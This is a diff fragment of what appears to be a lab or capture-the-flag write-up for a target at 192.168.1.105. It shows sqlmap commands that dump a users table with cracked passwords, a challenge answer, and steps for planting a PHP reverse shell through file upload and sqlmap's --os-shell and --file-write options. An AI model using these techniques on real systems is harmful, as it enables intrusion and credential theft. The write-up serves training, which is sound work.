@@ -60,4 +60,18 @@ privilege escalation, pivoting, service enumeration, and cron job exploitation</
 <ul>sqlmap -u "http://192.168.1.105/index.php?search=" --cookie="PHPSESSID=tghl288gtp81as870k5fd6h7m6" -D ticketing --columns -T users --dbms=mysql</ul>
 <ul>sqlmap -u "http://192.168.1.105/index.php?search=" --cookie="PHPSESSID=tghl288gtp81as870k5fd6h7m6" --dump -D ticketing --columns -T users --dbms=mysql</ul>
 <ul>Users are jason (password GuessMe!), admin (T0ughT0Crack) and andy (Str0ngPassw0rd)</ul>
+<ul>Answer: 3</ul>
+</ol></p>
+<p>Challenge 2</p>
+<p>Compromise the machine on IP address 192.168.1.105 and identify the value stored in userflag.txt? (Answer Format: xxNxxxNN)</p>
+<p><ol>
+    <ul>Kali has a collection of webshells at /usr/share/webshells</ul>
+    <ul>In the php folder a file named php-reverse-shell.php exists</ul>
+    <ul>nano php-reverse-shell.php and change the value at $ip into the IP address of the Kali machine</ul>
+    <ul>Use a webbrowser to go to 192.168.1.105/login.php</ul>
+    <ul>Login with admin:T0ughT0Crack and upload php-reverse-shell.php to the webserver</ul>
+    <ul>Unfortunately, there's a filter saying .txt files only (whitelist filter)</ul>
+    <ul>SQLMap trying to get a web shell with --os-shell flags</ul>
+    <ul>Now, I read that it's also possible to upload files using SQLMap with the --file-write and --file-dest flags</ul>
+    <ul>SQLMap is really a gem !</ul>
 </ol></p>
